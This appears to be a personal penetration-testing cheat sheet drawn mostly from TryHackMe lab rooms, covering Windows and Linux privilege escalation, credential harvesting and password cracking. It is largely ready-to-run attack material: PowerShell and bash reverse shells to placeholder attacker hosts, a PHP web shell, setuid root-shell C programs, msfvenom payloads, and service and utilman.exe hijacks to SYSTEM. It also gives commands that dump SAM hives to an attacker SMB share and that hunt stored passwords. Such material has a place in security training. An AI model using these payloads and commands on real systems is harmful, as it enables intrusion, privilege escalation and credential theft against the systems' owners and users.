When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:

```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell, so we'll be covering the standard one-liner PSH reverse shell here.  

This command is very convoluted, so for the sake of simplicity it will not be explained directly here. It is, however, an extremely useful one-liner to keep on hand:

```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```  

In order to use this, we need to replace "<IP>" and "<port>" with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed

In a very basic one line format:

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system -- be it Windows or Linux. The "pre" elements are to ensure that the results are formatted correctly on the page.

for getting root shell within target machine if sudo is allowed:

sudo find . -exec /bin/bash \; -quit

vim capabilities to spawn a root shell:

./vim -c ' :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

upgrading python shell (ENSURE YOU ARE IN ROOT DIR):
python -c 'import pty ;pty.spawn("bin/bash")'
python2 -c 'import pty;pty.spawn("bin/bash")'
python3 -c 'import pty;pty.spawn("bin/bash")'
export TERM=xterm

spawn a reverse shell inside a cronjob file:

bash -i >& /dev/tcp/<AM_IP>/<AM_port> 0>&1

script for launching system binary to infiltrate PATH exploit:

#include<unistd.h>
void main()
{  setuid(0);
   setgid(0);
   system("thm");
}

cmd to find writable folders within usr

find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u

An alternative could be the command below:

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

added “grep -v proc” to get rid of the many results related to running processes.

for situations in which SUID bit can be set for NFS, this exec script will do the job:

int main()
{  setuid(0);
   setgid(0);
   system("/bin/bash");
   return 0;
}

then compile the code with:

gcc <filename>.c -o <filename> -w

then set the SUID bit:

chmod +s <filename>

then check with:

ls -l <filename>

If you have find cmd as sudo, then spawn a shell

sudo find / -exec /bin/sh -p \; -quit

## Which command correctly saves the SAM registry hive for credential extraction?

Answer: reg save hklm\sam sam.hive

## Unattended Windows Installations

When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:

- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml

As part of these files, you might encounter credentials:

```shell-session
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

## Powershell History

Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a `cmd.exe` prompt:

```shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Note:** The command above will only work from cmd.exe, as Powershell won't recognize `%userprofile%` as an environment variable. To read the file from Powershell, you'd have to replace `%userprofile%` with `$Env:userprofile`.

## IIS Configuration

Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config` and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:

- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

Here is a quick way to find database connection strings on the file:

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
## Retrieve Credentials from Software: PuTTY

PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.

To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:

```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
## AlwaysInstallElevated

Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.

**Note:** The AlwaysInstallElevated method won't work on this room's machine and it's included as information only.

This method requires two registry values to be set. You can query these from the command line using the commands below.

Command Prompt

```shell-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below:

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:

Command Prompt

```shell-session
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

Kali Linux

```shell-session
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:

Command Prompt

```shell-session
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):

Command Prompt

```shell-session
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:

Command Prompt

```shell-session
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine with SYSTEM privileges:

Kali Linux

```shell-session
user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```
We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console.  

Once on the command prompt, we can check our privileges with the following command:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```
This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:

Kali Linux

```shell-session
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox: 

Command Prompt

```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:

Kali Linux

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

```

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

KaliLinux

```shell-session

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console.

Once on the command prompt, we can check our privileges with the following command:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION

SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled

```

We'll abuse `utilman.exe` to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen: 

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:

```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

After this, we will replace utilman.exe with a copy of cmd.exe:

```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

To trigger utilman, we will lock our screen from the start button:

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges.

RogueWinRM - BITS service exploit:
And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP ATTACK_PORT"
```
## Identifying Hashes

Sometimes, John won’t play nicely with automatically recognising and loading hashes, but that’s okay! We can use other tools to identify the hash and then set John to a specific format. There are multiple ways to do this, such as using an online hash identifier like [this site](https://hashes.com/en/tools/hash_identifier). I like to use a tool called [hash-identifier](https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master), a Python tool that is super easy to use and will tell you what different types of hashes the one you enter is likely to be, giving you more options if the first one fails.

To use hash-identifier, you can use `wget` or `curl` to download the Python file `hash-id.py` from its GitLab [page](https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py). Then, launch it with `python3 hash-id.py` and enter the hash you’re trying to identify. It will give you a list of the most probable formats. These two steps are shown in the terminal below.

Terminal

```shell-session
user@TryHackMe$ wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
```
**A Note on Formats:**

When you tell John to use formats, if you’re dealing with a standard hash type, e.g. md5 as in the example above, you have to prefix it with `raw-` to tell John you’re just dealing with a standard hash type, though this doesn’t always apply. To check if you need to add the prefix or not, you can list all of John’s formats using `john --list=formats` and either check manually or grep for your hash type using something like `john --list=formats | grep -iF "md5"`.

## How to create Custom Rules

Custom rules are defined in the `john.conf` file. This file can be found in `/opt/john/john.conf` on the TryHackMe Attackbox. It is usually located in `/etc/john/john.conf` if you have installed John using a package manager or built from source with `make`.

Let’s go over the syntax of these custom rules, using the example above as our target pattern. Note that you can define a massive level of granular control in these rules. I suggest looking at the wiki [here](https://www.openwall.com/john/doc/RULES.shtml) to get a full view of the modifiers you can use and more examples of rule implementation.

The first line:

`[List.Rules:THMRules]` is used to define the name of your rule; this is what you will use to call your custom rule a John argument.

We then use a regex style pattern match to define where the word will be modified; again, we will only cover the primary and most common modifiers here:

- `Az`: Takes the word and appends it with the characters you define
- `A0`: Takes the word and prepends it with the characters you define
- `c`: Capitalises the character positionally

These can be used in combination to define where and what in the word you want to modify.

Lastly, we must define what characters should be appended, prepended or otherwise included. We do this by adding character sets in square brackets `[ ]` where they should be used. These follow the modifier patterns inside double quotes `" "`. Here are some common examples:

- `[0-9]`: Will include numbers 0-9  
    
- `[0]`: Will include only the number 0
- `[A-z]`: Will include both upper and lowercase  
    
- `[A-Z]`: Will include only uppercase letters
- `[a-z]`: Will include only lowercase letters

Please note that:

- `[a]`: Will include only `a`
- `[!£$%@]`: Will include the symbols `!`, `£`, `$`, `%`, and `@`

Putting this all together, to generate a wordlist from the rules that would match the example password `Polopassword1!` (assuming the word `polopassword` was in our wordlist), we would create a rule entry that looks like this:

`[List.Rules:PoloPassword]`

`cAz"[0-9] [!£$%@]"`

Utilises the following:

- `c`: Capitalises the first letter
- `Az`: Appends to the end of the word
- `[0-9]`: A number in the range 0-9
- `[!£$%@]`: The password is followed by one of these symbols

## Using Custom Rules

We could then call this custom rule a John argument using the  `--rule=PoloPassword` flag.

As a full command: `john --wordlist=[path to wordlist] --rule=PoloPassword [path to file]`

As a note, I find it helpful to talk out the patterns if you’re writing a rule; as shown above, the same applies to writing RegEx patterns.

Jumbo John already has an extensive list of custom rules containing modifiers for use in almost all cases. If you get stuck, try looking at those rules [around line 678] if your syntax isn’t working correctly.

PHP code for password complexity example:
```
php
<?php
$password = $_POST['pass']; // Example1
$pattern = '/^(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).+$/';

if (preg_match($pattern, $password)) {
    echo "Password is valid.";
} else {
    echo "Password is invalid. It must contain at least one uppercase letter, one number, and one symbol.";
}
?>
```
### Automation

Below is a Python script that will check for valid emails in the target web app. Save the code below as **script.py**.

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```
To dump all of the links that are saved in Wayback Machine, we can use the tool called waybackurls. Hosted in [GitHub](https://github.com/tomnomnom/waybackurls), we can easily install this on our machine by using the below commands:

**Google Dorks**  

This is where your savvy with search engines shines. By crafting specific search queries, known as Google Dorks, you can find information that wasn’t meant to be public. These queries can pull up everything from exposed administrative directories to logs containing passwords and indices of sensitive directories. For example:

- To find administrative panels: `site:example.com inurl:admin`
- To unearth log files with passwords: `filetype:log "password" site:example.com`
- To discover backup directories: `intitle:"index of" "backup" site:example.com`
